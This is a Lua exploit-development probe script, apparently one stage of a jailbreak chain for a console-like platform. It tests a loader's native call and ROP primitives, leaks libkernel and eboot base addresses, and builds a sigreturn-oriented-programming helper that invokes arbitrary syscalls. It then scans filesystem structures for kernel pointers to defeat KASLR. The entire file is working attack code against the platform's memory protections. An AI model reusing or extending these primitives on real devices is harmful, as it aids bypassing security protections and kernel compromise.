-- CRASH_CLASS: LOW
-- PROBE 170a: Native API exploration
--
-- The loader has native.fcall_with_rax and a full ROP framework.
-- Carefully probe the API to understand calling convention and
-- use it for tight KASLR timing measurements.

print("=== PROBE 170a: NATIVE API ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

-- [A] Explore pivot_handler_rop table
print("--- [A] PIVOT_HANDLER_ROP ---")
if native and native.pivot_handler_rop then
    for k, v in pairs(native.pivot_handler_rop) do
        print("  " .. tostring(k) .. " = " .. type(v))
        if type(v) == "number" then
            print("    val=" .. v)
        elseif type(v) == "table" and v.h then
            local h, l = get_hi_lo(v)
            print("    val=0x" .. string.format("%X%08X", h, l))
        end
    end
end

-- [B] Explore get_lua_opt
print("")
print("--- [B] GET_LUA_OPT ---")
if native and native.get_lua_opt then
    for _, key in ipairs({"version", "debug", "help", "verbose",
        "syscall", "mode", "config", "target"}) do
        local ok, val = pcall(function() return native.get_lua_opt(key) end)
        if ok and val ~= nil then
            print("  " .. key .. "=" .. tostring(val))
        end
    end
end

-- [C] Careful fcall_with_rax test
print("")
print("--- [C] FCALL_WITH_RAX ---")
if native and native.fcall_with_rax then
    -- Test 1: try with syscall number 20 (getpid)
    local ok1, rv1 = pcall(function()
        return native.fcall_with_rax(20)
    end)
    if ok1 then
        local h1, l1 = get_hi_lo(rv1)
        print("fcall(20): h=0x" .. string.format("%X", h1) ..
            " l=0x" .. string.format("%X", l1) ..
            " num=" .. to_num(rv1))
    else
        print("fcall(20): ERROR " .. tostring(rv1))
    end

    -- Test 2: try with 0 args
    local ok2, rv2 = pcall(function()
        return native.fcall_with_rax()
    end)
    if ok2 then
        print("fcall(): " .. to_num(rv2))
    else
        print("fcall(): ERROR " .. tostring(rv2))
    end

    -- Test 3: try with address of getpid (from dynlib)
    -- First get libkernel base
    local info = memory.alloc(0x200)
    local safe_wd = function(a, v) memory.write_dword(a, v) end
    local safe_rd = function(a) return to_num(memory.read_dword(a)) end
    safe_wd(info, 0x160)
    local sc_info = make_syscall(593)

    -- Handle 0x1 is usually libkernel
    pcall(function() sc_info(uint64(0x1), info) end)
    local lk_lo = safe_rd(info + 0x108)
    local lk_hi = safe_rd(info + 0x10C)
    print("libkernel_text_base=0x" .. string.format("%X%08X", lk_hi, lk_lo))

    -- Handle 0 is eboot
    safe_wd(info, 0x160)
    pcall(function() sc_info(uint64(0x0), info) end)
    local eb_lo = safe_rd(info + 0x108)
    local eb_hi = safe_rd(info + 0x10C)
    print("eboot_text_base=0x" .. string.format("%X%08X", eb_hi, eb_lo))

    -- Try fcall with different arg counts
    -- Maybe it takes (function_addr, arg1, arg2, ...)
    -- Or maybe it takes (syscall_num, arg1, ...)
    -- Try getpid syscall number as rax value
    local ok3, rv3 = pcall(function()
        return native.fcall_with_rax(uint64(20))
    end)
    if ok3 then
        print("fcall(uint64(20)): " .. to_num(rv3))
    else
        print("fcall(uint64(20)): ERROR " .. tostring(rv3))
    end

    -- Try getuid (sys 24)
    local ok4, rv4 = pcall(function()
        return native.fcall_with_rax(24)
    end)
    if ok4 then
        print("fcall(24/getuid): " .. to_num(rv4))
    else
        print("fcall(24/getuid): ERROR " .. tostring(rv4))
    end

    -- Try with address and an argument
    local ok5, rv5 = pcall(function()
        return native.fcall_with_rax(20, 0)
    end)
    if ok5 then
        print("fcall(20, 0): " .. to_num(rv5))
    else
        print("fcall(20, 0): ERROR " .. tostring(rv5))
    end
end

-- [D] Try native.fcall (without _with_rax)
print("")
print("--- [D] NATIVE.FCALL ---")
if native and native.fcall then
    local ok1, rv1 = pcall(function()
        return native.fcall(20)
    end)
    if ok1 then
        print("fcall(20): " .. to_num(rv1))
    else
        print("fcall(20): ERROR " .. tostring(rv1))
    end

    local ok2, rv2 = pcall(function()
        return native.fcall(24)
    end)
    if ok2 then
        print("fcall(24/getuid): " .. to_num(rv2))
    else
        print("fcall(24/getuid): ERROR " .. tostring(rv2))
    end
end

-- [E] Try native.read_buffer / write_buffer
print("")
print("--- [E] READ/WRITE BUFFER ---")
if native and native.read_buffer then
    -- Try reading from a known address (our heap)
    local buf = memory.alloc(32)
    memory.write_dword(buf, 0xDEADBEEF)

    local ok, val = pcall(function()
        return native.read_buffer(uint64(buf), 4)
    end)
    if ok then
        print("read_buffer: " .. tostring(val))
        if type(val) == "string" then
            print("  len=" .. #val)
            local bytes = {}
            for i = 1, math.min(#val, 16) do
                table.insert(bytes, string.format("%02X", string.byte(val, i)))
            end
            print("  hex=" .. table.concat(bytes, " "))
        end
    else
        print("read_buffer: ERROR " .. tostring(val))
    end
end

-- [F] getfsstat (lost from 169a)
print("")
print("--- [F] GETFSSTAT ---")
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    memory.write_qword(srop_ctx + MC + 0xA0, sc_addr)
    memory.write_qword(srop_ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(srop_ctx + MC + 0x08, a1) end
    if a2 then memory.write_qword(srop_ctx + MC + 0x10, a2) end
    if a3 then memory.write_qword(srop_ctx + MC + 0x18, a3) end
    if a4 then memory.write_qword(srop_ctx + MC + 0x50, a4) end
    if a5 then memory.write_qword(srop_ctx + MC + 0x28, a5) end
    if a6 then memory.write_qword(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local function wq(a,v) memory.write_qword(a,v) end
local function wd(a,v) memory.write_dword(a,v) end
local function rd2(a) return to_num(memory.read_dword(a)) end
local function rq2(a) return memory.read_qword(a) end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x400000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end

-- getfsstat(buf, bufsize, MNT_NOWAIT=2) = sys 395
local FS = 0x10000
for off = 0, 0x3FFF, 4 do wd(gpu + FS + off, 0) end
local rv = srop(395, ga(FS), uint64(0x4000), uint64(2))
local rvv = rv and to_num(rv) or -999
print("getfsstat=" .. rvv)

if rvv > 0 and rvv < 20 then
    for i = 0, math.min(rvv - 1, 5) do
        local base = FS + i * 0x230
        local tname = ""
        for j = 0, 15 do
            local b = math.floor(rd2(gpu + base + 0x88 + (j - j%4)) /
                (256 ^ (j % 4))) % 256
            if b == 0 then break end
            tname = tname .. string.char(b)
        end
        local mnt = ""
        for j = 0, 31 do
            local b = math.floor(rd2(gpu + base + 0xF0 + (j - j%4)) /
                (256 ^ (j % 4))) % 256
            if b == 0 then break end
            mnt = mnt .. string.char(b)
        end
        local from = ""
        for j = 0, 31 do
            local b = math.floor(rd2(gpu + base + 0x98 + (j - j%4)) /
                (256 ^ (j % 4))) % 256
            if b == 0 then break end
            from = from .. string.char(b)
        end
        print("  fs[" .. i .. "]: " .. tname .. " " .. from .. " on " .. mnt)

        -- Scan for kernel pointers
        for off = 0, 0x22C, 8 do
            local val = rq2(gpu + base + off)
            local vh, vl = get_hi_lo(val)
            if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                print("    *** KPTR +" .. string.format("%03X", off) ..
                    "=0x" .. string.format("%X%08X", vh, vl) .. " ***")
            end
        end
    end
end

-- [G] getcwd (sys 326)
print("")
print("--- [G] GETCWD ---")
local CWD = 0x20000
for off = 0, 0xFF, 4 do wd(gpu + CWD + off, 0) end
rv = srop(326, ga(CWD), uint64(0x100))
rvv = rv and to_num(rv) or -999
print("getcwd=" .. rvv)
if rvv == 0 then
    local cwd = ""
    for i = 0, 63 do
        local b = math.floor(rd2(gpu + CWD + (i - i%4)) /
            (256 ^ (i % 4))) % 256
        if b == 0 then break end
        cwd = cwd .. string.char(b)
    end
    print("cwd=\"" .. cwd .. "\"")
end

-- [H] readlink /proc/curproc/file or /proc/self/exe
print("")
print("--- [H] READLINK ---")
local paths = {"/proc/curproc/file", "/proc/self/exe"}
for _, p in ipairs(paths) do
    local POFF = 0x30000
    for off = 0, 0x3F, 4 do wd(gpu + POFF + off, 0) end
    for i = 1, #p do
        local bi = i - 1
        local do2 = bi - (bi % 4)
        local cur = rd2(gpu + POFF + do2)
        local b = string.byte(p, i)
        cur = cur - (math.floor(cur / (256 ^ (bi % 4))) % 256) * (256 ^ (bi % 4))
        cur = cur + b * (256 ^ (bi % 4))
        wd(gpu + POFF + do2, cur)
    end

    local LBUF = 0x31000
    for off = 0, 0xFF, 4 do wd(gpu + LBUF + off, 0) end
    rv = srop(58, ga(POFF), ga(LBUF), uint64(0x100))
    rvv = rv and to_num(rv) or -999
    if rvv > 0 then
        local link = ""
        for i = 0, math.min(rvv - 1, 63) do
            local b = math.floor(rd2(gpu + LBUF + (i - i%4)) /
                (256 ^ (i % 4))) % 256
            if b > 0 then link = link .. string.char(b) end
        end
        print(p .. " -> " .. link)
    else
        print(p .. ": rv=" .. rvv)
    end
end

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
